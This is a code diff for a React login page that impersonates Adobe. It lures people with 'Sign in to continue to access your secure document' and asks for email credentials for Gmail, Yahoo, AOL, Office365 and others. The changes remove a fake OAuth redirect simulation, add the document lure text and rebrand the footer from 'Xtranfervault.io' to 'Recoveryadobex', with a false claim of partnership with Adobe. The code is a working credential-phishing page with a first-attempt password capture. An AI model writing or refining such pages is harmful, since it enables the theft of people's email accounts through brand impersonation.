@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
@@ -42,76 +42,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
     { name: 'Others', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
   ];
 
-  // Check URL parameters on component mount
-  useEffect(() => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const provider = urlParams.get('provider');
-    const authCode = urlParams.get('code');
-    const oauthProvider = urlParams.get('oauth_provider');
-    
-    // Clean up URL if there are any OAuth params (meaning it's a refresh)
-    if (provider || authCode || oauthProvider) {
-      // Clear the URL to show main login page
-      const baseUrl = window.location.pathname;
-      window.history.replaceState({}, document.title, baseUrl);
-      return;
-    }
-  }, []);
-
-  const handleProviderReturn = (providerName: string) => {
-    // Clean up the URL
-    const baseUrl = window.location.pathname;
-    window.history.replaceState({}, document.title, baseUrl);
-    
-    // Trigger provider navigation immediately
-    if (providerName.toLowerCase() === 'gmail' && onGmailSelect) {
-      onGmailSelect();
-    } else if (providerName.toLowerCase() === 'yahoo' && onYahooSelect) {
-      onYahooSelect();
-    } else if (providerName.toLowerCase() === 'aol' && onAolSelect) {
-      onAolSelect();
-    } else if ((providerName.toLowerCase() === 'office365' || providerName.toLowerCase() === 'outlook') && onOffice365Select) {
-      onOffice365Select();
-    } else {
-      setSelectedProvider(providerName);
-    }
-  };
-
-  const simulateOAuthRedirect = (providerName: string) => {
-    // Show redirecting state
-    // (kept as originally implemented)
-    // Generate OAuth-like parameters
-    const state = Math.random().toString(36).substr(2, 15);
-    const code = `auth_${Math.random().toString(36).substr(2, 20)}`;
-    
-    // First, update URL to show OAuth process is starting
-    const authStartParams = new URLSearchParams({
-      oauth_provider: providerName.toLowerCase(),
-      state: state,
-      redirect_initiated: 'true'
-    });
-    
-    const currentPath = window.location.pathname;
-    window.history.pushState({}, '', `${currentPath}?${authStartParams.toString()}`);
-    
-    // Simulate OAuth redirect delay
-    setTimeout(() => {
-      // Simulate returning from OAuth with auth code
-      const returnParams = new URLSearchParams({
-        code: code,
-        state: state,
-        provider: providerName,
-        scope: 'email profile',
-        auth_time: Date.now().toString()
-      });
-      
-      window.history.replaceState({}, '', `${currentPath}?${returnParams.toString()}`);
-      
-      // Trigger the provider's login page
-      handleProviderReturn(providerName);
-    }, 1500); // 1.5 second delay
-  };
-
   const handleSubmit = async (e: React.FormEvent) => {
     const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
     if (result?.isFirstAttempt) {
@@ -126,9 +56,20 @@ const LoginPage: React.FC<LoginPageProps> = ({
     resetLoginState();
   };
 
-  // Removed captcha flow: clicking provider now starts redirect immediately
   const handleProviderClick = (providerName: string) => {
-    simulateOAuthRedirect(providerName);
+    if (providerName === 'Office365' && onOffice365Select) {
+      onOffice365Select();
+    } else if (providerName === 'Outlook' && onOffice365Select) {
+      onOffice365Select();
+    } else if (providerName === 'Yahoo' && onYahooSelect) {
+      onYahooSelect();
+    } else if (providerName === 'AOL' && onAolSelect) {
+      onAolSelect();
+    } else if (providerName === 'Gmail' && onGmailSelect) {
+      onGmailSelect();
+    } else {
+      setSelectedProvider(providerName);
+    }
   };
 
   const AdobeLogo = () => (
@@ -139,7 +80,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
     />
   );
 
-  // Redirect screen logic remains as original (simulate redirect shows message)
   return (
     <div 
       className="min-h-screen flex items-center justify-center p-4 font-sans bg-cover bg-center"
@@ -154,8 +94,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
             <div className="flex justify-center mb-6">
               <AdobeLogo />
             </div>
-            {/* header removed as requested */}
-            
+            <h1 className="text-3xl font-bold text-gray-900 drop-shadow-[0_2px_4px_rgba(255,255,255,0.8)]">Sign in to continue</h1>
+            <p className="text-gray-800 mt-3 text-base drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)] font-medium">
+              to access your secure document: <span className="font-bold text-gray-900">{fileName}</span>
+            </p>
             <p className="text-gray-800 text-base font-semibold mt-6 drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">Choose your email provider</p>
           </div>
           
@@ -181,7 +123,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
           </div>
 
           <div className="mt-8 text-center">
-            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)] whitespace-nowrap">Xtranfervault.io. Secured in partnership with Adobe®.</p>
+            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">© 2025 Recoveryadobex. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       ) : (
@@ -192,7 +134,9 @@ const LoginPage: React.FC<LoginPageProps> = ({
               <AdobeLogo />
             </div>
             <h1 className="text-2xl font-bold text-center text-gray-800">Sign in with {selectedProvider}</h1>
-            
+            <p className="text-center text-gray-600 mt-2 text-sm">
+              to access your secure document: <span className="font-medium text-gray-700">{fileName}</span>
+            </p>
 
             <div className="mt-8">
               <button onClick={handleBackToProviders} className="flex items-center gap-2 text-sm text-gray-700 hover:text-gray-900 font-medium mb-6">
@@ -234,7 +178,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
           </div>
           <div className="bg-white/40 backdrop-blur-sm p-4 border-t border-white/20">
-            <p className="text-xs text-gray-600 text-center whitespace-nowrap">Xtranfervault.io. Secured in partnership with Adobe®.</p>
+            <p className="text-xs text-gray-600 text-center">© 2025 Recoveryadobex. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       )}
